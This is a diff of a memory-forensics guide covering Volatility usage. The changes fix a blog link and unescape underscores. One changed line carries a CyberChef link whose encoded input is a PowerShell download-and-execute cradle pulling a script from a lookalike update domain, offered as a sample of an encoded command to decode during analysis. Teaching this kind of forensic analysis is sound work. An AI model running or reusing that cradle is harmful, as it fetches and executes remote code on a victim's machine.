@@ -18,7 +18,7 @@ You can often find a lot of interesting strings with the `strings` tool, but the
 
 You can find an example challenge where the goal was to find 3 pieces of information about some malware that had run in the memory dump:
 
-{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-santa-is-coming-to-town-2021/honeypot" %}
+{% embed url="https://jorianwoltjer.com/blog/p/ctf/cyber-santa-is-coming-to-town-2021/honeypot" %}
 Writeup of a Forensics challenge where you had to analyze a memory dump
 {% endembed %}
 
@@ -169,7 +169,7 @@ python3 vol.py -f file.dmp windows.cmdline.CmdLine  # Command-line (arguments) f
 {% endtab %}
 {% endtabs %}
 
-You might see a PowerShell process with the `-EncodedCommand` or `/e` argument, and a big random string. This is actually a Base64 and UTF16 encoded command that is executed in PowerShell, and you can use a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From\_Base64\('A-Za-z0-9%2B/%3D',true,false\)Decode\_text\('UTF-16LE%20\(1200\)'\)Syntax\_highlighter\('powershell'\)\&input=YVFCbEFIZ0FJQUFvQUNnQWJnQmxBSGNBTFFCdkFHSUFhZ0JsQUdNQWRBQWdBRzRBWlFCMEFDNEFkd0JsQUdJQVl3QnNBR2tBWlFCdUFIUUFLUUF1QUdRQWJ3QjNBRzRBYkFCdkFHRUFaQUJ6QUhRQWNnQnBBRzRBWndBb0FDY0FhQUIwQUhRQWNBQnpBRG9BTHdBdkFIY0FhUUJ1QUdRQWJ3QjNBSE1BYkFCcEFIWUFaUUIxQUhBQVpBQmhBSFFBWlFCeUFDNEFZd0J2QUcwQUx3QjFBSEFBWkFCaEFIUUFaUUF1QUhBQWN3QXhBQ2NBS1FBcEFBPT0) for example to decode the command.&#x20;
+You might see a PowerShell process with the `-EncodedCommand` or `/e` argument, and a big random string. This is actually a Base64 and UTF16 encoded command that is executed in PowerShell, and you can use a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64\('A-Za-z0-9%2B/%3D',true,false\)Decode_text\('UTF-16LE%20\(1200\)'\)Syntax_highlighter\('powershell'\)\&input=YVFCbEFIZ0FJQUFvQUNnQWJnQmxBSGNBTFFCdkFHSUFhZ0JsQUdNQWRBQWdBRzRBWlFCMEFDNEFkd0JsQUdJQVl3QnNBR2tBWlFCdUFIUUFLUUF1QUdRQWJ3QjNBRzRBYkFCdkFHRUFaQUJ6QUhRQWNnQnBBRzRBWndBb0FDY0FhQUIwQUhRQWNBQnpBRG9BTHdBdkFIY0FhUUJ1QUdRQWJ3QjNBSE1BYkFCcEFIWUFaUUIxQUhBQVpBQmhBSFFBWlFCeUFDNEFZd0J2QUcwQUx3QjFBSEFBWkFCaEFIUUFaUUF1QUhBQWN3QXhBQ2NBS1FBcEFBPT0) for example to decode the command.&#x20;
 
 ### Environment variables
 
@@ -316,7 +316,7 @@ vol2 -f file.dmp --profile=PROFILE screenshot --dump-dir=screenshot  # Dump a fe
 
 #### Example:
 
-![Example desktop showing a single window and a taskbar](../.gitbook/assets/session\_2.WinSta0.Default.png)
+![Example desktop showing a single window and a taskbar](../.gitbook/assets/session_2.WinSta0.Default.png)
 {% endtab %}
 {% endtabs %}
 
